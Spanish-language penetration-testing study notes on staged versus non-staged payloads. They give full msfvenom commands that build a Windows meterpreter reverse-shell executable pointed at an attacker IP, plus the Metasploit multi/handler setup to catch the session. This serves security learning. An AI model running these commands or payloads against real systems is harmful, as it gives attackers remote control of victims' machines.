#Explotacion 
## Staged
#### Definición

>Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
>------

Podemos usar la herramienta [[MSFVENOM]] y luego con [[METASPLOIT]] poniéndonos en escucha obtendremos nuestra shell.
Con la opción `-p` seleccionamos el tipo de payload, con `-f` el tipo de fichero, con `-o` como quieres que te lo exporte, `LHOST=` cargamos la IP de la maquia atacantes, con `LPORT=` el puerto en el que estaremos en escucha, `--platform` para seleccionar el OS y `-a` para indicar la arquitectura por ejemplo `-a x64`. 

Un ejemplo hacia una maquina Windows seria el siguiente.
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<IP_Atacante> LPORT=<Puerto> -f exe -o reverse.exe
```

Nos creara un ejecutable que lo tendremos que transferir a la maquina victima para poder ejecutarlo en ella.
Deberemos de ejecutar [[METASPLOIT]] y crear un listener que es desde donde estaremos en escucha.
Tenemos que usar el exploit de multihandeler
```shell
use exploit/multi/handler
```

Dentro de este exploit tendremos que configurar el puerto de escucha (el mismo que el payload) y la IP de nuestra maquina atacante (la misma que el payload) también deberemos de cargar el payload que hemos usado y ejecutar el exploit, lo que nos pondrá en escucha.
Una vez que hayamos ejecutado el payload habremos obtenido una sesión de meterpreter.

## Non-Staged
#### Definición

>Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
>---------------------

Para que sea d este tipo lo único que cambia es la forma de crear el payload con [[MSFVENOM]]
```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=<IP_Atacante> LPORT=<Puerto> -f exe -o reverse.exe
```